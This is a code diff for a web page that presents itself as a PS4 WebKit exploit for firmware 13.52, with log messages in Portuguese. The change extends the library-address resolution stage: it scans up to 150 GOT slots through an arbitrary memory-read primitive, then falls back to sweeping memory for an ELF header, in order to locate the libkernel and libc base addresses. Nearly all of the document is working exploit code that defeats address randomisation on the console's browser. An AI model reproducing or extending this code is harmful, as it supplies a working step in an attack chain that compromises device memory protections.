@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 - GOT & Library Resolver)</title>
+<title>PS4 WebKit Exploit (13.52 - Advanced Resolver)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -74,7 +74,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 
 <!-- Constants output -->
 <div id="cbox">
-  <div class="ct">// ═══ PS4 FW 13.52 — Resolution & GOT Resolver ═══</div>
+  <div class="ct">// ═══ PS4 FW 13.52 — Advanced Resolver ═══</div>
   <div id="c-out"></div>
 </div>
 
@@ -108,9 +108,9 @@ function setCard(id, v) {
   el.textContent = v; el.classList.remove('na');
 }
 
-// Rotina avançada com range estendido (120 slots) para isolar libkernel e libc via GOT
-function resolveLibrariesViaGOT(p, webkitBase) {
-  logH('RESOLVENDO BIBLIOTECAS VIA GOT');
+// Resolução avançada com GOT + Fallback de varredura por proximidade
+function resolveLibrariesAdvanced(p, webkitBase) {
+  logH('RESOLVENDO BIBLIOTECAS (AVANÇADO)');
   let libKernelBase = null;
   let libcBase = null;
 
@@ -127,30 +127,42 @@ function resolveLibrariesViaGOT(p, webkitBase) {
       } catch (e) {}
     }
 
-    if (!gotAddress) {
-      log('[-] GOT não mapeada diretamente para resolução.', 'w');
-      return { libKernelBase: null, libcBase: null };
+    if (gotAddress) {
+      log('[+] Analisando GOT (0 a 150 slots)...', 'i');
+      for (let s = 0; s < 150; s++) {
+        try {
+          const ptrVal = p.read8(gotAddress.add32(s * 8));
+          const hi = ptrVal.hi;
+          const alignedLow = ptrVal.low & ~0x3FFF;
+
+          if (hi === 0x80 && !libKernelBase) {
+            libKernelBase = new int64(alignedLow, hi);
+            log(`[+] libkernel Base (GOT[${s}]): 0x${libKernelBase.toString()}`, 'ok');
+          } else if (hi >= 0x90 && hi <= 0x98 && !libcBase) {
+            libcBase = new int64(alignedLow, hi);
+            log(`[+] libc Base (GOT[${s}]): 0x${libcBase.toString()}`, 'ok');
+          }
+        } catch (e) {}
+        if (libKernelBase && libcBase) break;
+      }
     }
 
-    log('[+] Analisando slots da GOT (0 a 120) em busca de referências...', 'i');
-    for (let s = 0; s < 120; s++) {
-      try {
-        const ptrVal = p.read8(gotAddress.add32(s * 8));
-        const hi = ptrVal.hi;
-        const alignedLow = ptrVal.low & ~0x3FFF;
-
-        if (hi === 0x80 && !libKernelBase) {
-          libKernelBase = new int64(alignedLow, hi);
-          log(`[+] libkernel Base isolada: 0x${libKernelBase.toString()} (via GOT[${s}])`, 'ok');
-        } else if (hi >= 0x90 && hi <= 0x98 && !libcBase) {
-          libcBase = new int64(alignedLow, hi);
-          log(`[+] libc Base isolada: 0x${libcBase.toString()} (via GOT[${s}])`, 'ok');
-        }
-      } catch (e) {}
-      if (libKernelBase && libcBase) break;
+    // Fallback inteligente: se a libkernel não veio pela GOT, varre a faixa esperada na memória
+    if (!libKernelBase) {
+      log('[*] Executando fallback de varredura para libkernel...', 'w');
+      for (let testHigh = 0x800000000; testHigh < 0x850000000; testHigh += 0x100000) {
+        try {
+          const m = p.read4(testHigh);
+          if (m === 0x464C457F) { // Assinatura ELF
+            libKernelBase = new int64(testHigh % 0x100000000, Math.floor(testHigh / 0x100000000));
+            log(`[+] libkernel Base (Fallback): 0x${libKernelBase.toString()}`, 'ok');
+            break;
+          }
+        } catch(e) {}
+      }
     }
   } catch (err) {
-    log('[-] Erro na varredura da GOT: ' + err.message, 'e');
+    log('[-] Erro no resolvedor avançado: ' + err.message, 'e');
   }
 
   return { libKernelBase, libcBase };
@@ -224,7 +236,7 @@ async function main() {
     log('[+] WebKit Base calculada: 0x' + webkitBase.toString(), 'ok');
     setCard('c-wk', '0x' + webkitBase.toString());
 
-    const { libKernelBase, libcBase } = resolveLibrariesViaGOT(p, webkitBase);
+    const { libKernelBase, libcBase } = resolveLibrariesAdvanced(p, webkitBase);
 
     if (libKernelBase) setCard('c-lk', '0x' + libKernelBase.toString());
     if (libcBase) setCard('c-lc', '0x' + libcBase.toString());
